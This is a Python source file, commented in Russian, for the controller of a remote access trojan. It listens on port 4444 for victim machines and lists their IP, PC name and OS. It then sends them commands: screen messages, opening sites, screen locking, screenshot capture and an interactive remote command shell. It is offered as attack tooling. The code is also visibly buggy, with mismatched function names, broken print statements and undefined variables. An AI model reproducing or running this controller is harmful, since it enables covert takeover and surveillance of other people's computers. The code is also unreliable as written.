import socket, os, time, threading, sys
from queue import Queue
# Хакер
intThreads = 2
arrJobs = [1,2]
queue = Queue()

arrAddresses = []
arrConnections = []

strHost = '192.168.1.150'   #ip хакера
intPort = 4444

intBuff = 1024
decode_utf = lambda data: data.decode("utf-8")

remove_quotes = lambda string: string.replace("\"","")

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: conn.send(data)

recv = lambda buffer: conn.recv(buffer)
def recvall(buffer):
	byData = b""
	while True:
		bytPart = recv(buffer)
		if len(bytPart) == buffer:
			return bytPart
		byData += bytPart

		if len(byData) == buffer:
			return byData
def create_socket():
	global objSocket
	try:
		objSocket = socket.socket()
		objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	except socket.error() as strError:
		print("Error creating socket" + str(strError))
def socket_bind():
	global objSocket
	try:
		print("Listening on port:" + str(intPort))
		objSocket.bind((strHost,intPort))
		objSocket.listen(20)
	except socket.error() as strError:
		print("Error binding socket" +str(strError))
		socket_bind()
def socket_accept():
	while  True:
		try:
			conn, address = objSocket.accept()
			conn.setblocking(1)
			arrConnections.append(conn)
			client_info = decode_utf(conn.recv(intBuff)).split("',")
			address += client_info[0], client_info[1], client_info[2]
			arrAddresses.append(address)
			print("\n"+ "Connection has been established : {0} ({1})".format(address[0],address[2]))
		except socket.error:
			print("Error acceptting connections")
			continue

def menu_help():
	print("\n"+"--help")
	print("--l system  (система)")
	print("--x exit (выход)")
	print("--m [text] (сообщение на экран")
	print("--i 0")
	print("--p (скрин экрана")
	print("--x 1 (заблокировать экран)")
	print("--e")
def main_menu():
	while  True:
		strChoice =input("\n"+"~#")
		if strChoice == "--l":
			list_connections()
		elif strChoice[:3] == "--i" and len(strChoice) > 3:
			conn = select_connection(strChoice[4:], "True")
			if conn is not None:
				send_command()
		elif strChoice == "--p":
			screenshot()

		elif strChoice =="--x":
			close()
			break
		else:
			print('invalid choice')
			menu_help()
def close():
	global arrConnections, arrAddresses
	if len(arrAddresses) ==0:
		return
	for intCounter, conn in enumerate(arrConnections):
		conn.send(str.encode("exit"))
		conn.close()
	del arrConnections; arrConnections = []
	del arrAddresses; arrAddresses = []
def list_connections():
	if len(arrConnections) > 0:
		strClients = ""
		for intCounter, conn in enumerate(arrConnections):
			strClients += str(intCounter) + 4*" " + str(arrAddresses[intCounter][0]) + 4*" " + \
				str(arrAddresses[intCounter][1]) + 4*" "+ str(arrAddresses[intCounter][2])+ 4*" "+ \
				str(arrAddresses[intCounter][3]) + "\n"

		print("\n"+ "ID"+ 3*" "+center(str(arrAddresses[0][0])), "IP" ) + 4*" "+
			center(str(arrAddresses[0][1]), "Port") + 4*" "+
			center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
			center(str(arrAddresses[0][3]), "OS") + "\n" +strClients, end= ""
	else:
		print("No connections(нет соединения)")
def select_connection(connection_id, blnGetResponse):
	global conn, arrInfo
	try:
		connection_id = int(connection_id)
		conn = arrConnections[connection_id] 
	except:
		print("invalid choice")
		return
	else:
		arrInfo = str(arrAddresses[connection_id][0]),str(arrAddresses[connection_id][2]), \
		str(arrAddresses[connection_id][3]), \
		str(arrAddresses[connection_id][4])
		if blnGetResponse == "True":
			print("You are connected to" + arrInfo[0] + "......." + "\n")
		return conn

def send_commands():
	while True:
		strChoice = input("\n" + "Type Selection")
		if strChoice[:3] == "--m" and len(strChoice) > 3:
			strMsg = "msg" + strChoice[4:] 
			send(str.encode(strMsg))
		elif strChoice[:3] == "--o" and len(strChoice) > 3:
			strSite = "site" + strChoice[4:]
			send(str.encode(strSite))
		elif strChoice == "--p":
			screenshot()
		elif strChoice == "--x 1":
			send(str.encode("lock"))
		elif strChoice == "--e":
			command_shell()
def command_shell():
	send(str.encode("cmd"))
	strDefault = "\n"+ decode_utf(recv(intBuff)) + ">"
	print(strDefault, end= "")

	while True:
		strCommand = input()
		if strCommand == "quit" or strCommand == "exit":
			send(str.encode("goback"))
		elif strCommand == "cmd":
			print("Please do not use this command..")
		elif len(str(strCommand)) > 0:
			send(str.encode(strCommand))
			intBuff = int(decode_utf(recv(intBuff)))
			strClientResponse = decode_utf(recvall(intBuffer))
			print(strClientResponse, end="")
		else:
			print(strDefault, end="")
def screenshot():
	send(str.encode("screen"))
	strClientResponse = decode_utf(recv(intBuff))
	print("\n" + strClientResponse)
	intBuffer = ''
	for intCounter in range(0,len(strClientResponse)):
		if strClientResponse[intCounter].isdigit():
			intBuffer += strClientResponse[intCounter]
	intBuffer = int(intBuffer)
	strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
	ScrnData = recvall(intBuffer)
	objPic = open(strFile, "wb")
	objPic.write(ScrnData); objPic.close()
	print("Done" + "\n" + "Total bytes recevied:" + os.path.getsize(strFile)) + "bytes"


def create_threads():
	for _ in range(intThreads):
		objThread =threading.Thread(target=work)
		objThread.daemon = True
		objThread.start()
	queue.join()

def work():
	while True:
		intValue = queue.get()
		if intValue == 1:
			create_socket()
			socket_bind()
			socket_accept()
		elif intValue == 2:
			while True:
				time.sleep(0.2)
				if len(arrAddresses) > 0:
					break

		queue.task_done()
		queue.task_done()
		sys.exit(0)
def create_jobs():
	for intThreads in arrJobs:
		queue.put(intThreads)
	queue.join()

create_threads()
create_jobs()

